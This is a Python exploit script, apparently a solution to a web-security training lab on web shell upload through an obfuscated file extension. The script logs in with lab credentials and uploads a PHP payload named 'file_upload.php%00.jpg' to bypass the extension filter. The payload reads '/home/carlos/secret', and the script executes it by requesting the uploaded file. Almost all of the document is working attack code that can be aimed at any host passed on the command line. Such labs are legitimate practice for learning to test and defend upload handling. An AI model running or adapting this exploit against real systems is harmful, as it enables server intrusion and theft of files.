# Lab: Web shell upload via obfuscated file extension

import requests
import re
import sys
import bs4
from requests.utils import requote_uri
import argparse
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token():
    
    # CSRF token
    url = target_url + "/login"
    out = r.get(url, verify = False, proxies = proxies)
    if out.status_code == 200:
        soup = bs4.BeautifulSoup(out.text, features = "html.parser")
        csrf_token = soup.find('input',{'name':'csrf'}).get('value')
        print("[+] CSRF Token stolen")
    else:
        print("[-] Could not get CSRF token")
        print(out.status_code)
        sys.exit(0)

    return csrf_token

def login(csrf_token, username = "wiener", password = "peter"):

    url = target_url + "/login"

    data = {
        'csrf':csrf_token,
        'username':username,
        'password':password
    }

    headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0'
    }

    out = r.post(url, data=data, headers=headers, verify=False, proxies=proxies, allow_redirects=False)
    if out.status_code == 302:
        print("[+] Logged in as wiener")
        redirect_location = out.headers['Location']
        out = r.get(url, verify = False, proxies = proxies)
        if out.status_code == 200:
            soup = bs4.BeautifulSoup(out.text, features = "html.parser")
            csrf_token = soup.find('input',{'name':'csrf'}).get('value')
            print("[+] Got Logged CSRF token")
            return csrf_token
        else:
            print("[-] Error getting Logged CSRF token")
            sys.exit(0)
    else:
        print("[-] Error while loggin as wiener")
        sys.exit(0)

def upload_file(csrf_token):

    url = target_url + "/my-account/avatar"

    # file = {
    #     'name': ('file_name.php', 'file_content', 'Content-Type')
    # }

    file = {
        'avatar': ('file_upload.php%00.jpg', '<?php echo file_get_contents("/home/carlos/secret") ?>','text/php'),
        'user': (None, 'wiener', None),
        'csrf': (None, csrf_token, None)
    }

    out = r.post(url, files=file, verify=False, proxies=proxies)
    if out.status_code == 200:
        print("[+] Successfully uploaded malicious file")
    else:
        print("[-] Error uploading file")
        print(out.status_code)
        sys.exit(0)
    
    # Execute the file by the get request
    url = target_url + "/files/avatars/file_upload.php"

    out = r.get(url, verify=False, proxies=proxies)
    if out.status_code == 200:
        print("[+] Exploited by requesting uploaded malicious file")
        print(out.content)
    else:
        print("[-] Error while requesting the malicious file")
        print(out.status_code)
        sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', type=str, required=True)
    args = parser.parse_args()

    target_url = args.host

    r = requests.Session()
    proxies = {
        'https':'http://127.0.0.1:8080',
        'http':'http://127.0.0.1:8080'
    }

    csrf_token = get_csrf_token()
    logged_csrf_token = login(csrf_token)
    upload_file(logged_csrf_token)